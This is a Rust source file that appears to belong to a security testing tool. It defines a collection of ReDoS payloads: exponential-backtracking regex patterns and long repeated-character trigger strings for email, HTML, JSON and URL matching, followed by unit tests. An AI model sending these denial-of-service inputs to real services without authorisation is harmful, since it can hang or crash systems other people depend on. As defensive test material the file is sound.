use super::{Payload, PayloadType, Severity};

pub fn get_payloads() -> Vec<Payload> {
    payload_vec!(PayloadType::Redos,
        "pattern", [
            ("(a+)+$", "Classic exponential regex", Severity::Critical),
            ("(a|aa)+$", "Alternation exponential", Severity::Critical),
            ("(a|a?)+$", "Optional exponential", Severity::Critical),
            ("(.*a){x}", "Quantifier with suffix", Severity::Critical),
            ("(a+)+b", "Exponential with suffix", Severity::Critical),
            ("(a+)+$", "Backtracking classic", Severity::Critical),
            ("([a-zA-Z]+)*$", "Character class quantified", Severity::High),
            ("(a+)+b$", "With terminal character", Severity::High),
            ("(([^a]|.)+)+$", "Complex alternation", Severity::High),
            ("(a*)+b", "Star inside plus", Severity::High),
        ];
        "trigger", [
            ("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!", "Trigger (a+)+$ backtracking", Severity::Critical),
            ("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!", "Extended a sequence", Severity::Critical),
            ("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!", "Very long a sequence", Severity::Critical),
            ("aaaaaaaaaaaaX", "Trigger for (a+)+b", Severity::Critical),
            ("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!a", "Mixed trigger", Severity::High),
        ];
        "email", [
            ("^([a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\\.[a-zA-Z0-9-.]+)$", "Email regex vulnerable", Severity::Critical),
            ("^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$", "Common email pattern", Severity::High),
            ("a@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", "Long email trigger", Severity::Critical),
            ("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@!", "Bad email trigger", Severity::Critical),
        ];
        "html", [
            ("<\\s*img[^>]*>", "IMG tag regex", Severity::High),
            ("<img src=x onerror=\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\">", "Long HTML trigger", Severity::Critical),
            ("<div>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</div>", "Long div content", Severity::High),
        ];
        "json", [
            ("\"[^\"]*\"", "Simple string regex", Severity::Medium),
            ("\"[^\"]*(\\\\.[^\"]*)*\"", "Escape handling regex", Severity::High),
            ("\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\\\", "JSON string trigger", Severity::High),
        ];
        "url", [
            ("^(https?://)?([\\da-z\\.-]+)\\.([a-z\\.]{2,6})([/\\w \\.-]*)*/?$", "URL regex", Severity::High),
            ("https://example.com/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", "URL path trigger", Severity::Medium),
        ];
        "time-test", [
            (format!("{}!", "a".repeat(30)), "Short ReDoS trigger", Severity::High),
            (format!("{}!", "a".repeat(50)), "Medium ReDoS trigger", Severity::Critical),
            (format!("{}!", "a".repeat(100)), "Long ReDoS trigger", Severity::Critical),
            (format!("{}!", "a".repeat(200)), "Very long ReDoS trigger", Severity::Critical),
            (format!("{}X", "a".repeat(30)), "Suffix mismatch trigger", Severity::High),
            (format!("{}b", "a".repeat(30)), "Different suffix trigger", Severity::High),
        ];
        "ipv4-regex", [
            ("127.0.0.1", "IPv4 regex backtracking - valid IP", Severity::Medium),
            ("255.255.255.255", "IPv4 regex backtracking - max IP", Severity::Medium),
            ("999.999.999.999", "IPv4 regex backtracking - invalid IP", Severity::High),
        ];
        "phone-regex", [
            ("+1-555-123-4567", "Phone number regex backtracking", Severity::Medium),
            ("+44 20 7946 0958", "UK phone format backtracking", Severity::Medium),
            ("555-123-4567", "US phone format backtracking", Severity::Medium),
        ];
        "credit-card", [
            ("4111-1111-1111-1111", "Credit card regex backtracking", Severity::Medium),
            ("5500 0000 0000 0004", "Mastercard regex backtracking", Severity::Medium),
            ("378282246310005", "Amex regex backtracking", Severity::Medium),
        ];
        "date-regex", [
            ("2024-01-01", "ISO date regex backtracking", Severity::Medium),
            ("01/31/2024", "US date regex backtracking", Severity::Medium),
            ("31-12-2024", "EU date regex backtracking", Severity::Medium),
        ];
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_get_payloads_returns_non_empty() {
        let payloads = get_payloads();
        assert!(!payloads.is_empty());
    }

    #[test]
    fn minimum_payload_count() {
        let payloads = get_payloads();
        assert!(payloads.len() >= 25);
        assert!(payloads.len() < 10000);
    }

    #[test]
    fn test_payloads_are_non_empty_strings() {
        let payloads = get_payloads();
        for p in &payloads {
            assert!(
                !p.payload.is_empty(),
                "Payload is empty: {:?}",
                p.description
            );
        }
    }

    #[test]
    fn test_payloads_contain_expected_patterns() {
        let payloads = get_payloads();
        let has_pattern = payloads.iter().any(|p| p.payload.contains("(a+)+"));
        let has_trigger = payloads.iter().any(|p| p.payload.contains("aaaa"));
        let has_email = payloads.iter().any(|p| p.payload.contains("@"));
        assert!(has_pattern, "Missing regex pattern payload");
        assert!(has_trigger, "Missing backtracking trigger payload");
        assert!(has_email, "Missing email regex payload");
    }
}
